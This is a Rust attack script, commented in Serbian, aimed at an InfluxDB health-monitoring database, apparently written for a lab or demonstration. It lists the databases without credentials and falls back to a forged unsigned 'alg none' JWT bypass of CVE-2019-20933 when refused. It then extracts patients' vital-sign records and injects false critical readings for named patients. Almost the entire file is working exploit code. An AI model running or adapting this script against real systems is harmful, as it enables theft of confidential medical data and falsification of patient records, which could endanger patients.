use reqwest::Client;
use serde_json::Value;
use std::time::Duration;
use tokio::time::sleep;
use chrono::Utc;


const DB_NAME: &str = "health_monitoring";
const INFLUX_URL: &str = "http://{URL}:8086";

fn get_url() -> String {
    std::env::var("INFLUXDB_URL")
        .expect("INFLUXDB_URL environment varijabla nije postavljena!")
}

fn get_influx_url() -> String {
    let url = get_url();
    format!("http://{}:8086", url)
}

fn create_unsigned_jwt() -> String {
    // JWT sa algoritmom "none" - CVE-2019-20933
    // Header: {"alg":"none","typ":"JWT"}
    let header = base64_encode(b"{\"alg\":\"none\",\"typ\":\"JWT\"}");
    // Payload: admin korisnik sa neograničenim pristupom
    let payload = base64_encode(
        format!("{{\"username\":\"admin\",\"exp\":{}}}", 
            Utc::now().timestamp() + 86400
        ).as_bytes()
    );
    // Bez potpisa - algoritam "none"
    format!("{}.{}.", header, payload)
}

fn base64_encode(input: &[u8]) -> String {
    let encoded = base64_standard(input);
    encoded
        .trim_end_matches('=')
        .replace('+', "-")
        .replace('/', "_")
        .to_string()
}

fn base64_standard(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    let mut i = 0;
    while i < input.len() {
        let b0 = input[i] as usize;
        let b1 = if i + 1 < input.len() { input[i + 1] as usize } else { 0 };
        let b2 = if i + 2 < input.len() { input[i + 2] as usize } else { 0 };
        result.push(CHARS[(b0 >> 2)] as char);
        result.push(CHARS[((b0 & 3) << 4) | (b1 >> 4)] as char);
        if i + 1 < input.len() {
            result.push(CHARS[((b1 & 0xf) << 2) | (b2 >> 6)] as char);
        } else {
            result.push('=');
        }
        if i + 2 < input.len() {
            result.push(CHARS[b2 & 0x3f] as char);
        } else {
            result.push('=');
        }
        i += 3;
    }
    result
}

async fn phase1_enumerate_databases(client: &Client) -> Vec<String> {
    println!("\n-----------------------------------------------------");
    println!("  FAZA 1: Enumeracija baza podataka (bez kredencijala)");
    println!("-----------------------------------------------------");

    let influx_url = get_influx_url();
    let url = format!("{}/query", influx_url);
    
    // Napad: Direktan pristup bez autentifikacije (podrazumevana konfiguracija)
    println!("\nPokušaj pristupa bez autentifikacije...");
    let response = client
        .get(&url)
        .query(&[("q", "SHOW DATABASES")])
        .send()
        .await;

    match response {
        Ok(resp) if resp.status().is_success() => {
            let body: Value = resp.json().await.unwrap_or_default();
            println!("InfluxDB prihvata zahteve BEZ autentifikacije!");
            
            let mut databases = Vec::new();
            if let Some(results) = body["results"].as_array() {
                for result in results {
                    if let Some(series) = result["series"].as_array() {
                        for serie in series {
                            if let Some(values) = serie["values"].as_array() {
                                for db in values {
                                    if let Some(name) = db[0].as_str() {
                                        databases.push(name.to_string());
                                        println!("Baza podataka: '{}'", name);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            databases
        }
        Ok(resp) => {
            // Napad 2: JWT "none" algoritam bypass (CVE-2019-20933)
            println!("Server zahteva autentifikaciju. Pokušaj JWT bypass...");
            let jwt = create_unsigned_jwt();
            println!("Kreiran JWT token sa algoritmom 'none': {}", &jwt[..50]);
            
            let resp2 = client
                .get(&url)
                .query(&[("q", "SHOW DATABASES")])
                .header("Authorization", format!("Bearer {}", jwt))
                .send()
                .await;
            
            match resp2 {
                Ok(r) if r.status().is_success() => {
                    println!("JWT 'none' algoritam bypass uspešan!");
                    vec!["health_monitoring".to_string()]
                }
                _ => {
                    println!("JWT bypass nije uspeo. Server je bezbedan.");
                    vec![]
                }
            }
        }
        Err(e) => {
            println!("Konekcija odbijena: {}", e);
            vec![]
        }
    }
}

async fn phase2_extract_patient_data(client: &Client, database: &str) {
    println!("\n-----------------------------------------------------");
    println!("  FAZA 2: Ekstrakcija poverljivih medicinskih podataka ");
    println!("-----------------------------------------------------");

    let influx_url = get_influx_url();
    let url = format!("{}/query", influx_url);

    // PRikazivanje merenja u bazi
    println!("\nPrikazivanje svih merenja u bazi '{}'...", database);
    let resp = client
        .get(&url)
        .query(&[("db", database), ("q", "SHOW MEASUREMENTS")])
        .send()
        .await;

    if let Ok(r) = resp {
        if r.status().is_success() {
            let body: Value = r.json().await.unwrap_or_default();
            println!("Merenja u bazi:");
            if let Some(results) = body["results"].as_array() {
                for result in results {
                    if let Some(series) = result["series"].as_array() {
                        for serie in series {
                            if let Some(values) = serie["values"].as_array() {
                                for m in values {
                                    println!("  -> {}", m[0].as_str().unwrap_or("?"));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Ekstrakcija podataka pacijenata
    println!("\nEkstrakcija medicinskih podataka svih pacijenata...");
    let query = "SELECT * FROM vitals ORDER BY time DESC LIMIT 20";
    
    let resp = client
        .get(&url)
        .query(&[("db", database), ("q", query)])
        .send()
        .await;

    match resp {
        Ok(r) if r.status().is_success() => {
            let body: Value = r.json().await.unwrap_or_default();
            println!("Izvučeni poverljivi medicinski podaci:\n");
            println!("{:<15} {:<12} {:<12} {:<12} {:<10} {:<8}", 
                "Pacijent", "Puls (bpm)", "BP Sist.", "BP Dij.", "Temp (°C)", "SpO2 (%)");
            println!("{}", "-".repeat(75));
            
            if let Some(results) = body["results"].as_array() {
                for result in results {
                    if let Some(series) = result["series"].as_array() {
                        for serie in series {
                            let cols: Vec<&str> = serie["columns"]
                                .as_array()
                                .map(|c| c.iter().filter_map(|v| v.as_str()).collect())
                                .unwrap_or_default();
                            
                            if let Some(values) = serie["values"].as_array() {
                                for row in values.iter().take(10) {
                                    let patient = get_col_val(&cols, row, "patient_id");
                                    let hr = get_col_val(&cols, row, "heart_rate");
                                    let bps = get_col_val(&cols, row, "bp_systolic");
                                    let bpd = get_col_val(&cols, row, "bp_diastolic");
                                    let temp = get_col_val(&cols, row, "temperature");
                                    let spo2 = get_col_val(&cols, row, "spo2");
                                    
                                    println!("{:<15} {:<12} {:<12} {:<12} {:<10} {:<8}",
                                        patient, hr, bps, bpd, temp, spo2);
                                }
                            }
                        }
                    }
                }
            }
            println!("\nMedicinski podaci pacijenata su kompromitovani!");
        }
        Ok(r) => println!("HTTP {}: Napad blokiran.", r.status()),
        Err(e) => println!("GREŠKA {}", e),
    }
}

fn get_col_val<'a>(cols: &[&str], row: &'a Value, name: &str) -> String {
    cols.iter()
        .position(|&c| c == name)
        .and_then(|i| row.get(i))
        .map(|v| match v {
            Value::String(s) => s.clone(),
            Value::Number(n) => format!("{:.1}", n.as_f64().unwrap_or(0.0)),
            Value::Null => "N/A".to_string(),
            _ => v.to_string(),
        })
        .unwrap_or_else(|| "N/A".to_string())
}

async fn phase3_inject_false_data(client: &Client) {
    println!("\n-----------------------------------------------------");
    println!("  FAZA 3: Ubacivanje lažnih medicinskih podataka        ");
    println!("-----------------------------------------------------");

    let influx_url = get_influx_url();
    let url = format!("{}/write", influx_url);
    
    // Ubacivanje lažnih kritičnih vrednosti za pacijenta
    let malicious_data = vec![
        "vitals,patient_id=patient_001 heart_rate=210.0,bp_systolic=220.0,bp_diastolic=140.0,temperature=41.5,spo2=72.0",
        "vitals,patient_id=patient_002 heart_rate=25.0,bp_systolic=60.0,bp_diastolic=30.0,temperature=34.0,spo2=65.0",
    ];

    println!("\nUbacivanje lažnih kritičnih vrednosti...");
    for data in &malicious_data {
        let resp = client
            .post(&url)
            .query(&[("db", DB_NAME)])
            .body(*data)
            .send()
            .await;
        
        match resp {
            Ok(r) if r.status().as_u16() == 204 => {
                println!("Ubačeni lažni podaci: {}", &data[..60]);
            }
            Ok(r) => println!("HTTP {}: Server odbio lažne podatke", r.status()),
            Err(e) => println!("GREŠKA {}", e),
        }
    }
    
}

#[tokio::main]
async fn main() {

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .expect("Nije moguće kreirati HTTP klijent");

    println!("  Čekanje da sistem bude aktivan...");
    sleep(Duration::from_secs(10)).await;

    // Faza 1: Enumeracija
    let databases = phase1_enumerate_databases(&client).await;

    if databases.is_empty() {
        println!("\nNapad neuspešan - sistem je bezbedan.");
        return;
    }

    sleep(Duration::from_secs(2)).await;

    // Faza 2: Ekstrakcija podataka
    phase2_extract_patient_data(&client, DB_NAME).await;

    sleep(Duration::from_secs(2)).await;

    // Faza 3: Ubacivanje lažnih podataka
    phase3_inject_false_data(&client).await;

    println!("\nNapad uspešno realizovan.");
}
